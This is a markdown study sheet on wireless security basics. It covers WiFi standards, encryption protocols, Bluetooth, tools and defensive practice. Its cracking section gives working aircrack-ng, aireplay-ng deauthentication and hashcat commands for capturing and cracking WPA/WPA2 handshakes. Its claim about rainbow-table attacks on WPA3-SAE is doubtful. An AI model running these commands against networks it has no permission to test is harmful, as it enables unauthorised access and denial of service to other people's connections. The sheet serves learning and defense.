# LEARNING Skill: Wireless Security Basics

## Purpose
Learn wireless security fundamentals.

## WiFi Basics

### Standards
```
802.11a  - 5GHz, 54Mbps
802.11b  - 2.4GHz, 11Mbps
802.11g  - 2.4GHz, 54Mbps
802.11n  - 2.4/5GHz, 600Mbps
802.11ac - 5GHz, 6.9Gbps
802.11ax - WiFi 6
```

### Bands
```
2.4GHz - Longer range, more congested
5GHz   - Shorter range, faster, less interference
```

## Authentication

### Open System
```
No authentication
Anyone can connect
Data sent unencrypted
```

### WPA/WPA2 Personal
```
Pre-shared key (PSK)
Password-based
WPA2 uses AES-CCMP
```

### WPA/WPA2 Enterprise
```
RADIUS authentication
Individual credentials
802.1X protocol
```

## Security Protocols

### WEP (Broken)
```
RC4 encryption
Static keys
Easily cracked
```

### WPA (Temporary)
```
TKIP (Temporal Key Integrity Protocol)
Stronger than WEP
Now deprecated
```

### WPA2 (Current)
```
AES-CCMP encryption
Strong security
Krack attack vulnerable (patched)
```

### WPA3 (Latest)
```
SAE (Simultaneous Authentication)
Better handshake
Protected management frames
```

## Cracking WPA/WPA2

### Capture Handshake
```bash
# Monitor mode
airmon-ng start wlan0
airodump-ng wlan0mon

# Capture specific network
airodump-ng -c 6 --bssid XX:XX:XX:XX:XX:XX -w capture wlan0mon
```

### Deauthentication
```bash
# Kick clients to force reauth
aireplay-ng --deauth 10 -a XX:XX:XX:XX:XX:XX wlan0mon
```

### Cracking
```bash
# With wordlist
aircrack-ng -w wordlist.txt -b XX:XX:XX:XX:XX:XX capture.cap

# With PMKID
hashcat -m 16800 -a 0 hash.txt wordlist.txt
```

## WPA3

### SAE Handshake
```
Password-to-key exchange
Resistant to offline dictionary
Difficult to crack
```

## Bluetooth

### Security
```
Bluetooth Classic vs BLE
Pairing modes 1-4
Encryption levels
```

### Attacks
```
BlueZ vulnerabilities
Fuzzing
Pairing attacks
```

## Tools

### WiFi
```
aircrack-ng    - WiFi suite
wireshark      - Packet analysis
reaver         - WPS cracking
hashcat        - Password cracking
fluxion        - Evil twin
```

### Bluetooth
```
bluetoothctl   - Control interface
hcitool        - Device scanning
btscanner      - Scanner tool
```

## Monitoring Mode

### Setup
```bash
# Enable
airmon-ng start wlan0

# Disable
airmon-ng stop wlan0mon
```

### Sniffing
```bash
tcpdump -i wlan0mon -n
wireshark -i wlan0mon
```

## WPA3-SAE Cracking

### Current Status
```
Theoretical weaknesses
Rainbow table attacks on small passwords
Best defense: Strong passphrase
```

## Defense

### Best Practices
```
- Use WPA3 when available
- Strong WiFi password (16+ chars)
- Disable WPS
- Update router firmware
- Monitor for rogue APs
```

## Legal Considerations
```
Only attack networks you own or have permission
Unauthorized access is illegal
Even wardriving can be questionable
```
